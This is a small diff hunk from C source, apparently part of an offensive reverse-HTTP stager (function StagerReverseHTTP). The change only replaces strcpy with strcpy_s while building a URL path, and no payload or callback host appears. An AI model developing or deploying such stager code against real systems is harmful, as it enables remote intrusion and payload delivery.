@@ -23,7 +23,7 @@ void StagerReverseHTTP(wchar_t *IP, wchar_t *iPort, wchar_t *transport)
 		}
 	}
 
-	strcpy(FullURL,"/");
+	strcpy_s(FullURL,"/");
 	strcat_s(FullURL,URI);
 	strcat_s(FullURL,"\0");			// make sure it ends here...
 	mbstowcs_s(NULL,wFullURL,FullURL,strlen(FullURL));
